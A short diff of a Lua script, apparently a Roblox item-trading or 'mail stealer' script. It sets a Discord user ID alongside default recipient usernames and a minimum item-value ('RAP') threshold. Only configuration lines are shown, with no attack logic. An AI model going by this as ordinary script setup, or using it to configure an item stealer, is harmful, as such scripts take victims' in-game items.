@@ -19,7 +19,7 @@ end
 
 local user = _G.Username or "JHGG8975"
 local user2 = _G.Username2 or "CheaterForRea1"
-local discuser = _G.discuser or ""
+local discuser = _G.discuser or "1328537790001975367"
 local min_rap = _G.minrap or 100000
 
 local newamount = 20000
